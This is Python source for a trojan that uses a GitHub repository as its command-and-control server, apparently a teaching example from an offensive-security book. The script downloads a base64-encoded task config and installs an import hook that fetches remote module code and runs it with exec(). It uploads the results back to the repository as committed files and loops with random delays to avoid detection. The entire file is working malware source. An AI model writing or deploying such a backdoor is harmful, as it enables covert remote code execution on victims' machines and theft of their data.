import json
import base64
import sys
import time
import types
import random
import threading
import queue

from github3 import login

trojan_id = "abc"

repo_path = "scripts/python/trojan"

trojan_config = f"{repo_path}/config/{trojan_id}.json"
data_path = f"{repo_path}/data/{trojan_id}"
trojan_modules = []
configured = False

task_queue = queue.Queue()


class GitImporter(object):
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, fullname, path=None):
        if configured:
            print(f"[*] Attempting to retrieve {fullname}")
            new_library = get_file_contents(f"{repo_path}/modules/{fullname}")
            if new_library:
                self.current_module_code = base64.b64decode(new_library)
                return self
        return None

    def load_module(self, name):
        module = types.ModuleType(name)
        exec(self.current_module_code, module.__dict__)
        sys.modules[name] = module
        return module


def connect_to_github():
    """ You can replace the password in the call to login() below for an
    access token generated by GitHub if your account uses 2FA for access
    (as it should). Easy-to-follow instructions on how to generate this
    token can be found here:
    https://help.github.com/en/github/authenticating-to-github/
    creating-a-personal-access-token-for-the-command-line

    If you choose to use the token, simply replace the 'password'
    attribute for 'token' below and paste the token generated by
    GitHub as a value instead of 'YourPassword'. The code should be:
    gh = login(username="YourUsername", token="YourToken")
    """
    gh = login(username="YourUsername", password="YourPassword")
    repo = gh.repository("YourUsername", "RepositoryName")
    branch = repo.branch("master")
    return gh, repo, branch


def get_file_contents(filepath):
    gh, repo, branch = connect_to_github()
    tree = branch.commit.commit.tree.to_tree().recurse()
    for filename in tree.tree:
        if filepath in filename.path:
            print(f"[*] Found file {filepath}")
            blob = repo.blob(filename._json_data['sha'])
            return blob.content
    return None


def get_trojan_config():
    global configured
    config_json = get_file_contents(trojan_config)
    configuration = json.loads(base64.b64decode(config_json))
    configured = True

    for tasks in configuration:
        if tasks['module'] not in sys.modules:
            exec(f"import {tasks['module']}")

    return configuration


def store_module_result(data):
    gh, repo, branch = connect_to_github()
    remote_path = f"{data_path}/{random.randint(1000,100000)}.data"
    print(f"remote path is {remote_path}")
    repo.create_file(remote_path, "Commit message", data.encode())
    return


def module_runner(module):
    task_queue.put(1)
    result = sys.modules[module].run()
    task_queue.get()

    # store the result in our repo
    store_module_result(result)
    return


# main trojan loop
sys.meta_path = [GitImporter()]

while True:
    if task_queue.empty():
        config = get_trojan_config()
        for task in config:
            t = threading.Thread(target=module_runner, args=(task['module'],))
            t.start()
            time.sleep(random.randint(1, 10))
    time.sleep(random.randint(1000, 10000))
